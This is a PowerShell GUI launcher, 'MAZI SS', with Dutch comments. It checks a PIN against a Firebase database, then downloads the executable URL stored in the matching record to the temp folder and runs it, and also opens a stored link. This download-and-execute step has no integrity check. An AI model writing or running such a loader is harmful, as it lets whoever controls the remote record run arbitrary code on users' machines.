# Forceer TLS 1.2 beveiliging (Cruciaal voor Firebase verbinding!)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "MAZI SS"
$form.Size = New-Object System.Drawing.Size(600, 450)
$form.BackColor = [System.Drawing.Color]::FromArgb(15, 15, 15)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"

# Sleepfunctie
$mouseDown = $false
$form.add_MouseDown({ $script:mouseDown = $true; $script:startPos = [System.Windows.Forms.Cursor]::Position; $script:formPos = $form.Location })
$form.add_MouseMove({
    if ($script:mouseDown) {
        $pos = [System.Windows.Forms.Cursor]::Position
        $form.Location = [System.Drawing.Point]::new($script:formPos.X + ($pos.X - $script:startPos.X), $script:formPos.Y + ($pos.Y - $script:startPos.Y))
    }
})
$form.add_MouseUp({ $script:mouseDown = $false })

# Titel
$title = New-Object System.Windows.Forms.Label
$title.Text = "MAZI SS"
$title.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::White
$title.Location = New-Object System.Drawing.Point(30, 30)
$title.Size = New-Object System.Drawing.Size(200, 40)
$form.Controls.Add($title)

# Input
$in = New-Object System.Windows.Forms.TextBox
$in.Size = New-Object System.Drawing.Size(200, 30)
$in.Location = New-Object System.Drawing.Point(200, 200)
$in.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$in.ForeColor = [System.Drawing.Color]::White
$in.TextAlign = "Center"
$form.Controls.Add($in)

# Knop
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "LAUNCH"
$btn.Size = New-Object System.Drawing.Size(200, 40)
$btn.Location = New-Object System.Drawing.Point(200, 250)
$btn.FlatStyle = "Flat"
$btn.BackColor = [System.Drawing.Color]::White
$form.Controls.Add($btn)

# Status
$status = New-Object System.Windows.Forms.Label
$status.Text = "READY"
$status.ForeColor = [System.Drawing.Color]::Gray
$status.Location = New-Object System.Drawing.Point(0, 320)
$status.Size = New-Object System.Drawing.Size(600, 20)
$status.TextAlign = "MiddleCenter"
$form.Controls.Add($status)

# Sluiten
$close = New-Object System.Windows.Forms.Label
$close.Text = "X"
$close.ForeColor = [System.Drawing.Color]::White
$close.Location = New-Object System.Drawing.Point(560, 10)
$close.add_Click({ $form.Close() })
$form.Controls.Add($close)

# --- DE ACTIE ---
$btn.Add_Click({
    $p = $in.Text.Trim()
    if ($p.Length -lt 1) { return }
    $status.Text = "CHECKING..."
    
    try {
        $u = "https://ss-mazi-default-rtdb.europe-west1.firebasedatabase.app/pins/$p.json"
        $data = Invoke-RestMethod -Uri $u -Method Get

        if ($data) {
            $status.Text = "SUCCESS!"
            $form.Refresh()

            # 1. DOWNLOAD HET BESTAND
            if ($data.bestand) {
                $file = $data.bestand.ToString()
                $path = "$env:TEMP\tool.exe"
                (New-Object System.Net.WebClient).DownloadFile($file, $path)
                Start-Process $path
            }

            # 2. OPEN DE LINK
            if ($data.link) {
                $web = $data.link.ToString()
                # Dwing de browser te openen via de shell
                Start-Process $web
            }

            $form.Close()
        } else {
            $status.Text = "INVALID PIN"
        }
    } catch {
        $status.Text = "CONNECTION ERROR"
    }
})

$form.ShowDialog()
